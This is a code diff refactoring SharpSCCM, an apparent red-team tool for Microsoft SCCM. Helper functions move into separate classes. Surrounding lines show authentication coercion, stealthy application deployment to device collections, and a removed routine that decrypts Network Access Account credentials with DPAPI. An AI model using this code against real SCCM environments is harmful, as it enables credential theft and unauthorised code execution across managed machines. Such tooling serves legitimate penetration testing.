@@ -58,7 +58,7 @@ namespace SharpSCCM
 
         static void GenerateCCR(string server, string sitecode, string target)
         {
-            ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+            ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
             Console.WriteLine($"[+] Generating a client configuration request (CCR) to coerce authentication to {target}");
             ManagementClass collectionClass = new ManagementClass(sccmConnection, new ManagementPath("SMS_Collection"), null);
             ManagementBaseObject generatorParams = collectionClass.GetMethodParameters("GenerateCCRByName");
@@ -77,7 +77,7 @@ namespace SharpSCCM
             {
                 foreach (ManagementObject collection in collections)
                 {
-                    GetClassInstances(scope, "SMS_CollectionMember_a", count, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", orderBy, dryRun, verbose);
+                    Management.GetClassInstances(scope, "SMS_CollectionMember_a", count, properties, $"CollectionID='{collection.GetPropertyValue("CollectionID")}'", orderBy, dryRun, verbose);
                 }
             }
             else
@@ -181,7 +181,7 @@ namespace SharpSCCM
 
         static void GetSitePushSettings(string server, string sitecode)
         {
-            ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+            ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
             ManagementObjectCollection results = searcher.Get();
             foreach (ManagementObject result in results)
@@ -245,7 +245,7 @@ namespace SharpSCCM
 
         static SmsClientId GetSmsId()
         {
-            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
+            ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\root\\ccm");
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_Client"));
             string SmsId = null;
             foreach (ManagementObject instance in searcher.Get())
@@ -285,43 +285,8 @@ namespace SharpSCCM
 
         static void LocalPushLogs(string startTime, string startDate)
         {
-            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\cimv2");
+            ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\root\\cimv2");
             DateTime startDateObj = DateTime.Parse(startDate);
-        }
-
-        static void LocalNetworkAccessAccounts(string masterkey)
-        {
-            ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
-            GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
-            ManagementObjectCollection accounts = searcher.Get();
-            if (accounts.Count > 0)
-            {
-                foreach (ManagementObject account in accounts)
-                {
-                    string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
-                    string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
-                    byte[] protectedUsernameBytes = StringToByteArray(protectedUsername);
-                    int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
-                    Array.Resize(ref protectedUsernameBytes, length);
-                    try
-                    {
-
-                        Dpapi.Execute(protectedUsername, masterkey);
-                        Dpapi.Execute(protectedPassword, masterkey);
-
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("[!] Data was not decrypted. An error occurred.");
-                        Console.WriteLine(e.ToString());
-                    }
-                }
-            }
-            else
-            {
-                Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
-            }
         }
 
         static void NewApplication(ManagementScope scope, string name, string path, bool runAsUser = false, bool stealth = false)
@@ -500,7 +465,7 @@ namespace SharpSCCM
                     Console.WriteLine("[+] Updated application to run in the context of the logged on user");
                 }
                 application.Put();
-                GetClassInstances(scope, "SMS_Application", false, null, $"LocalizedDisplayName='{name}'");
+                Management.GetClassInstances(scope, "SMS_Application", false, null, $"LocalizedDisplayName='{name}'");
             }
         }
 
@@ -521,7 +486,7 @@ namespace SharpSCCM
                 collection["LimitToCollectionId"] = "SMS00002";
             }
             collection.Put();
-            GetClassInstances(scope, "SMS_Collection", false, null, $"Name='{collectionName}'");
+            Management.GetClassInstances(scope, "SMS_Collection", false, null, $"Name='{collectionName}'");
         }
 
         static void NewDeployment(ManagementScope scope, string application, string collection)
@@ -586,112 +551,7 @@ namespace SharpSCCM
                     }
                 }
                 deployment.Put();
-                GetClassInstances(scope, "SMS_ApplicationAssignment", false, null, $"ApplicationName='{application}' AND CollectionName='{collection}'");
-            }
-        }
-
-        static ManagementScope NewSccmConnection(string path)
-        {
-            ConnectionOptions connection = new ConnectionOptions();
-            ManagementScope sccmConnection = new ManagementScope(path, connection);
-            try
-            {
-                Console.WriteLine($"[+] Connecting to {sccmConnection.Path}");
-                sccmConnection.Connect();
-            }
-            catch (System.UnauthorizedAccessException unauthorizedErr)
-            {
-                Console.WriteLine("[!] Access to WMI was not authorized (user name or password might be incorrect): " + unauthorizedErr.Message);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("[!] Error connecting to WMI: " + e.Message);
-            }
-            return sccmConnection;
-        }
-
-        static void RemoveApplication(ManagementScope scope, string applicationName)
-        {
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Application WHERE LocalizedDisplayName='{applicationName}'"));
-            ManagementObjectCollection applications = searcher.Get();
-            if (applications.Count > 0)
-            {
-                Console.WriteLine($"[+] Found {applications.Count} applications named {applicationName}");
-                foreach (ManagementObject application in applications)
-                {
-                    application.InvokeMethod("SetIsExpired", new object[] { "True" });
-                    application.Delete();
-                }
-                Console.WriteLine($"[+] Deleted all applications named {applicationName}");
-                Console.WriteLine($"[+] Querying for applications named {applicationName}");
-                string whereCondition = "LocalizedDisplayName='" + applicationName + "'";
-                GetClassInstances(scope, "SMS_Application", false, null, whereCondition);
-            }
-            else
-            {
-                Console.WriteLine($"[+] Found {applications.Count} applications named {applicationName}");
-            }
-        }
-
-        static void RemoveCollection(ManagementScope scope, string collection)
-        {
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_Collection WHERE Name='{collection}'"));
-            ManagementObjectCollection collections = searcher.Get();
-            if (collections.Count > 0)
-            {
-                Console.WriteLine($"[+] Found {collections.Count} collections named {collection}");
-                foreach (ManagementObject collectionObj in collections)
-                {
-                    collectionObj.Delete();
-                }
-                Console.WriteLine($"[+] Deleted all collections named {collection}");
-                Console.WriteLine($"[+] Querying for applications named {collection}");
-                string whereCondition = "Name='" + collection + "'";
-                GetClassInstances(scope, "SMS_Collection", false, null, whereCondition);
-            }
-            else
-            {
-                Console.WriteLine($"[+] Found {collections.Count} applications named {collections}");
-            }
-        }
-
-        static void RemoveDeployment(ManagementScope scope, string application, string collection)
-        {
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_ApplicationAssignment WHERE ApplicationName='{application}' AND CollectionName='{collection}'"));
-            ManagementObjectCollection deployments = searcher.Get();
-            if (deployments.Count > 0)
-            {
-                Console.WriteLine($"[+] Found deployment of {application} to {collection}");
-                foreach (ManagementObject deployment in deployments)
-                {
-                    deployment.Delete();
-                    Console.WriteLine($"[+] Deleted deployment of {application} to {collection}");
-                }
-                Console.WriteLine($"[+] Querying for deployments of {application} to {collection}");
-                string whereCondition = "ApplicationName='" + application + "' AND CollectionName='" + collection + "'";
-                GetClassInstances(scope, "SMS_ApplicationAssignment", false, null, whereCondition);
-            }
-            else
-            {
-                Console.WriteLine($"[+] Found {deployments.Count} deployments of {application} to {collection}");
-            }
-        }
-
-        static void RemoveDevice(ManagementScope scope, string guid)
-        {
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM SMS_R_SYSTEM WHERE SMSUniqueIdentifier='{guid}'"));
-            ManagementObjectCollection devices = searcher.Get();
-            if (devices.Count > 0)
-            {
-                foreach (ManagementObject device in devices)
-                {
-                    device.Delete();
-                    Console.WriteLine($"[+] Deleted device with SMSUniqueIdentifier {guid}");
-                }
-            }
-            else
-            {
-                Console.WriteLine($"[+] Found {devices.Count} devices with SMSUniqueIdentifier {guid}");
+                Management.GetClassInstances(scope, "SMS_ApplicationAssignment", false, null, $"ApplicationName='{application}' AND CollectionName='{collection}'");
             }
         }
 
@@ -717,157 +577,6 @@ namespace SharpSCCM
             catch (ManagementException err)
             {
                 Console.WriteLine("An error occurred while querying for WMI data: " + err.Message);
-            }
-        }
-
-        static void GetClasses(ManagementScope scope)
-        {
-            string query = "SELECT * FROM meta_class";
-            Console.WriteLine($"[+] Executing WQL query: {query}");
-            ObjectQuery objQuery = new ObjectQuery(query);
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
-            var classes = new List<string>();
-            foreach (ManagementClass wmiClass in searcher.Get())
-            {
-                classes.Add(wmiClass["__CLASS"].ToString());
-            }
-            classes.Sort();
-            Console.WriteLine(String.Join("\n", classes.ToArray()));
-        }
-
-        static void GetClassInstances(ManagementScope scope, string wmiClass, bool count = false, string[] properties = null, string whereCondition = null, string orderByColumn = null, bool dryRun = false, bool verbose = false)
-        {
-            try
-            {
-                string query = "";
-                string propString = "";
-                string whereClause = "";
-                string orderByClause = "";
-
-                if (verbose || count || properties == null)
-                {
-                    propString = "*";
-                }
-                else
-                {
-                    string[] keyPropertyNames = GetKeyPropertyNames(scope, wmiClass);
-                    properties = keyPropertyNames.Union(properties).ToArray();
-                    propString = string.Join(",", properties);
-                }
-                if (!string.IsNullOrEmpty(whereCondition))
-                {
-                    whereClause = $"WHERE {whereCondition}";
-                }
-                if (!string.IsNullOrEmpty(orderByColumn))
-                {
-                    orderByClause = $"ORDER BY {orderByColumn}";
-                }
-                if (count)
-                {
-                    query = $"SELECT COUNT({propString}) FROM {wmiClass} {whereClause}";
-                }
-                else
-                {
-                    query = $"SELECT {propString} FROM {wmiClass} {whereClause} {orderByClause}";
-                }
-
-                if (dryRun)
-                {
-                    Console.WriteLine($"[+] WQL query: {query}");
-                }
-                else
-                {
-                    Console.WriteLine($"[+] Executing WQL query: {query}");
-                    ObjectQuery objQuery = new ObjectQuery(query);
-                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
-                    Console.WriteLine("-----------------------------------");
-                    Console.WriteLine(wmiClass);
-                    Console.WriteLine("-----------------------------------");
-                    foreach (ManagementObject queryObj in searcher.Get())
-                    {
-                        // Get lazy properties unless we're just counting instances
-                        if (!count)
-                        {
-                            queryObj.Get();
-                        }
-                        foreach (PropertyData prop in queryObj.Properties)
-                        {
-                            // Print default properties if none specified, named properties if specified, or all properties if verbose
-                            if (properties == null || properties.Length == 0 || properties.Contains(prop.Name) || count || verbose)
-                            {
-                                if (prop.IsArray)
-                                {
-                                    // Test to see if we can display property values as strings, otherwise bail. Byte[] (e.g., Device.ObjectGUID) breaks things, Object[] (e.g., Collection.CollectionRules, Collection.RefreshSchedule) breaks things
-                                    if (prop.Value is String[])
-                                    {
-                                        String[] nestedValues = (String[])(prop.Value);
-                                        Console.WriteLine($"{prop.Name}: {string.Join(", ", nestedValues)}");
-                                    }
-                                    else if (prop.Value is int[])
-                                    {
-                                        int[] nestedValues = (int[])(prop.Value);
-                                        string[] nestedValueStrings = nestedValues.Select(x => x.ToString()).ToArray();
-                                        Console.WriteLine($"{prop.Name}: {string.Join(", ", nestedValueStrings)}");
-                                    }
-                                    else
-                                    {
-                                        string canConvertToString = prop.Value as string;
-                                        if (canConvertToString != null)
-                                        {
-                                            Console.WriteLine($"{prop.Name}: {canConvertToString}");
-                                        }
-                                        else
-                                        {
-                                            Console.WriteLine($"{prop.Name}: Can't display {prop.Type.ToString()} as a String");
-                                        }
-                                    }
-                                }
-                                else
-                                {
-                                    Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
-                                }
-                            }
-                        }
-                        Console.WriteLine("-----------------------------------");
-                    }
-                }
-            }
-            catch (ManagementException err)
-            {
-                Console.WriteLine("An error occurred while querying for WMI data: " + err.Message);
-            }
-        }
-
-        static void GetClassProperties(ManagementObject classInstance, bool showValue = false)
-        {
-            foreach (PropertyData property in classInstance.Properties)
-            {
-                if (!showValue)
-                {
-                    Console.WriteLine($"{property.Name} ({property.Type})");
-                }
-                else
-                {
-                    Console.WriteLine($"{property.Name} ({property.Type}): {property.Value}");
-                }
-            }
-        }
-
-        // Troubleshoot queryObj.Get() exception due to key properties not present when querying class instances
-        //https://stackoverflow.com/questions/49798851/how-to-get-methods-from-wmi
-        static string[] GetKeyPropertyNames(ManagementScope sccmConnection, string className)
-        {
-            using (ManagementClass managementClass = new ManagementClass(sccmConnection, new ManagementPath(className), new ObjectGetOptions()))
-            {
-                return managementClass.Properties
-                    .Cast<PropertyData>()
-                    .Where(
-                        property => property.Qualifiers
-                            .Cast<QualifierData>()
-                            .Any(qualifier => string.Equals(qualifier.Name, "Key", StringComparison.OrdinalIgnoreCase))
-                    )
-                    .Select(property => property.Name)
-                    .ToArray();
             }
         }
 
@@ -1060,7 +769,7 @@ namespace SharpSCCM
             addDeviceToCollection.Handler = CommandHandler.Create(
                 (string server, string sitecode, string deviceName, string collectionName) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     AddDeviceToCollection(sccmConnection, deviceName, collectionName);
                 });
 
@@ -1072,7 +781,7 @@ namespace SharpSCCM
             addUserToCollection.Handler = CommandHandler.Create(
                 (string server, string sitecode, string userName, string collectionName) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     AddUserToCollection(sccmConnection, userName, collectionName);
                 });
 
@@ -1116,8 +825,8 @@ namespace SharpSCCM
                     {
                         properties = new[] { "CI_ID", "CI_UniqueID", "CreatedBy", "DateCreated", "ExecutionContext", "DateLastModified", "IsDeployed", "IsEnabled", "IsHidden", "LastModifiedBy", "LocalizedDisplayName", "NumberOfDevicesWithApp", "NumberOfDevicesWithFailure", "NumberOfUsersWithApp", "NumberOfUsersWithFailure", "SourceSite" };
                     }
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    GetClassInstances(sccmConnection, "SMS_Application", count, properties, whereCondition, orderBy, dryRun, verbose);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Management.GetClassInstances(sccmConnection, "SMS_Application", count, properties, whereCondition, orderBy, dryRun, verbose);
                 });
 
             // get classes
@@ -1127,8 +836,8 @@ namespace SharpSCCM
             getClasses.Handler = CommandHandler.Create(
                 (string server, string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\" + wmiPath);
-                    GetClasses(sccmConnection);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\" + wmiPath);
+                    Management.GetClasses(sccmConnection);
                 });
 
             // get class-instances
@@ -1138,12 +847,12 @@ namespace SharpSCCM
             getClassInstances.Handler = CommandHandler.Create(
                 (string server, string sitecode, bool count, string wmiClass, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     if (properties.Length == 0)
                     {
                         verbose = true;
                     }
-                    GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
+                    Management.GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
                 });
 
             // get class-properties
@@ -1153,9 +862,9 @@ namespace SharpSCCM
             getClassProperties.Handler = CommandHandler.Create(
                 (string server, string sitecode, string wmiClass) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     ManagementObject classInstance = new ManagementClass(sccmConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
-                    GetClassProperties(classInstance);
+                    Management.GetClassProperties(classInstance);
                 });
 
             // get collection
@@ -1173,8 +882,8 @@ namespace SharpSCCM
                     {
                         properties = new[] { "CollectionID", "CollectionType", "IsBuiltIn", "LastMemberChangeTime", "LastRefreshTime", "LimitToCollectionName", "MemberClassName", "MemberCount", "Name" };
                     }
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    GetClassInstances(sccmConnection, "SMS_Collection", count, properties, whereCondition, orderBy, dryRun, verbose);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Management.GetClassInstances(sccmConnection, "SMS_Collection", count, properties, whereCondition, orderBy, dryRun, verbose);
                 });
 
             // get collection-member
@@ -1194,7 +903,7 @@ namespace SharpSCCM
                     }
                     else
                     {
-                        ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                        ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                         GetCollectionMember(sccmConnection, name, count, properties, orderBy, dryRun, verbose);
                     }
                 });
@@ -1214,8 +923,8 @@ namespace SharpSCCM
                     {
                         properties = new[] { "ApplicationName", "AssignedCI_UniqueID", "AssignedCIs", "AssignmentName", "CollectionName", "Enabled", "EnforcementDeadline", "LastModificationTime", "LastModifiedBy", "NotifyUser", "SourceSite", "TargetCollectionID", "UserUIExperience" };
                     }
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    GetClassInstances(sccmConnection, "SMS_ApplicationAssignment", count, properties, whereCondition, orderBy, dryRun, verbose);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Management.GetClassInstances(sccmConnection, "SMS_ApplicationAssignment", count, properties, whereCondition, orderBy, dryRun, verbose);
                 });
 
             // get device
@@ -1238,8 +947,8 @@ namespace SharpSCCM
                     {
                         properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogontimeStamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
                     }
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    GetClassInstances(sccmConnection, "SMS_R_System", count, properties, whereCondition, orderBy, dryRun, verbose);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Management.GetClassInstances(sccmConnection, "SMS_R_System", count, properties, whereCondition, orderBy, dryRun, verbose);
                 });
 
             // get naa
@@ -1272,8 +981,8 @@ namespace SharpSCCM
                     {
                         verbose = true;
                     }
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    GetClassInstances(sccmConnection, "SMS_UserMachineRelationShip", count, properties, whereCondition, orderBy, dryRun, verbose);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Management.GetClassInstances(sccmConnection, "SMS_UserMachineRelationShip", count, properties, whereCondition, orderBy, dryRun, verbose);
                 });
 
             // get site-push-settings
@@ -1317,7 +1026,7 @@ namespace SharpSCCM
             invokeQuery.Handler = CommandHandler.Create(
                 (string server, string sitecode, string query) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     InvokeQuery(sccmConnection, query);
                 });
 
@@ -1328,7 +1037,7 @@ namespace SharpSCCM
             invokeUpdate.Handler = CommandHandler.Create(
                 (string server, string sitecode, string collection) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     InvokeUpdate(sccmConnection, collection);
                 });
 
@@ -1343,12 +1052,12 @@ namespace SharpSCCM
             localClassInstances.Handler = CommandHandler.Create(
                 (bool count, string wmiClass, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\root\\ccm");
                     if (properties.Length == 0)
                     {
                         verbose = true;
                     }
-                    GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
+                    Management.GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
                 });
 
             // local class-properties
@@ -1358,9 +1067,9 @@ namespace SharpSCCM
             localClassProperties.Handler = CommandHandler.Create(
                 (string wmiClass) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\root\\ccm");
                     ManagementObject classInstance = new ManagementClass(sccmConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
-                    GetClassProperties(classInstance);
+                    Management.GetClassProperties(classInstance);
                 });
 
             // local clientinfo
@@ -1369,8 +1078,8 @@ namespace SharpSCCM
             getLocalClientInfo.Handler = CommandHandler.Create(
                 new Action(() =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
-                    GetClassInstances(sccmConnection, "CCM_InstalledComponent", false, new[] { "Version" }, "Name='SmsClient'");
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\root\\ccm");
+                    Management.GetClassInstances(sccmConnection, "CCM_InstalledComponent", false, new[] { "Version" }, "Name='SmsClient'");
                 }));
 
             // local create-ccr
@@ -1410,7 +1119,7 @@ namespace SharpSCCM
             getLocalNetworkAccessAccountsWmi.Handler = CommandHandler.Create(
                 new Action(() =>
                 {
-                    LocalNetworkAccessAccounts();
+                    Credentials.LocalNetworkAccessAccounts();
                 }));
 
             // local naa-disk
@@ -1429,8 +1138,8 @@ namespace SharpSCCM
             localSiteInfo.Handler = CommandHandler.Create(
                 new Action(() =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
-                    GetClassInstances(sccmConnection, "SMS_Authority", false, new[] { "CurrentManagementPoint", "Name" });
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\root\\ccm");
+                    Management.GetClassInstances(sccmConnection, "SMS_Authority", false, new[] { "CurrentManagementPoint", "Name" });
                 }));
 
             // local classes
@@ -1440,8 +1149,8 @@ namespace SharpSCCM
             localClasses.Handler = CommandHandler.Create(
                 (string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\" + wmiPath);
-                    GetClasses(sccmConnection);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\localhost\\" + wmiPath);
+                    Management.GetClasses(sccmConnection);
                 });
 
             // new
@@ -1458,7 +1167,7 @@ namespace SharpSCCM
             newApplication.Handler = CommandHandler.Create(
                 (string server, string sitecode, string name, string path, bool runAsUser, bool stealth) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     NewApplication(sccmConnection, name, path, runAsUser, stealth);
                 });
 
@@ -1471,7 +1180,7 @@ namespace SharpSCCM
             newCollection.Handler = CommandHandler.Create(
                 (string server, string sitecode, string collectionType, string collectionName) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     NewCollection(sccmConnection, collectionType, collectionName);
                 });
 
@@ -1483,7 +1192,7 @@ namespace SharpSCCM
             newDeployment.Handler = CommandHandler.Create(
                 (string server, string sitecode, string name, string application, string collection) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     NewDeployment(sccmConnection, application, collection);
                 });
 
@@ -1498,8 +1207,8 @@ namespace SharpSCCM
             removeApplication.Handler = CommandHandler.Create(
                 (string server, string sitecode, string name) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    RemoveApplication(sccmConnection, name);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Cleanup.RemoveApplication(sccmConnection, name);
                 });
 
             // remove collection
@@ -1509,8 +1218,8 @@ namespace SharpSCCM
             removeCollection.Handler = CommandHandler.Create(
                 (string server, string sitecode, string name) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    RemoveCollection(sccmConnection, name);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Cleanup.RemoveCollection(sccmConnection, name);
                 });
 
             // remove deployment
@@ -1521,8 +1230,8 @@ namespace SharpSCCM
             removeDeployment.Handler = CommandHandler.Create(
                 (string server, string sitecode, string application, string collection) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    RemoveDeployment(sccmConnection, application, collection);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Cleanup.RemoveDeployment(sccmConnection, application, collection);
                 });
 
             // remove device
@@ -1532,15 +1241,13 @@ namespace SharpSCCM
             removeDevice.Handler = CommandHandler.Create(
                 (string server, string sitecode, string guid) =>
                 {
-                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-                    RemoveDevice(sccmConnection, guid);
+                    ManagementScope sccmConnection = Management.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                    Cleanup.RemoveDevice(sccmConnection, guid);
                 });
 
             // Execute
             var commandLine = new CommandLineBuilder(rootCommand).UseDefaults().Build();
             commandLine.Invoke(args);
         }
-
-
     }
 }
